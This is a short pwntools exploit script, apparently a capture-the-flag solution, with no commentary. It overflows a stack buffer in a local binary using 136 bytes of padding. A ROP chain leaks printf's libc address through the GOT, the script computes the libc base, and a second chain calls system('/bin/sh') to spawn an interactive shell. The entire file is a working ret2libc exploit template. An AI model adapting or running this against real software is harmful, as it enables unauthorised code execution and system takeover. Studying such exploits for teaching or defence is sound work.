from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('127.0.0.1',31337)
    else:
        return process(e.path)

p = start()

ret = p64(r.find_gadget(['ret'])[0])
pop_rdi = p64(r.find_gadget(['pop rdi','ret'])[0])
puts_got = p64(e.got['printf'])
puts_plt = p64(e.plt['printf'])

chain = cyclic(136)
chain += pop_rdi
chain += puts_got
chain += ret
chain += puts_plt
chain += p64(e.sym['main'])

p.recvuntil(b'corporate_prefixes >>>')
p.sendline(chain)
p.recvuntil(b'<<< music_theory.')

leak = p.recvline()
while b'\x7f' not in leak:
   leak = p.recvline()

puts_leak = u64(leak[0:6]+b'\x00\x00')
l.address=puts_leak-l.sym['printf']


log.info('Leaked Puts 0x%x' %puts_leak)
log.info('Libc Base 0x%x' %l.address)

bin_sh = p64(next(l.search(b'/bin/sh\0')))
system = p64(l.sym['system'])

chain = cyclic(136)
chain += pop_rdi
chain += bin_sh
chain += system

p.sendline(chain)

p.interactive()
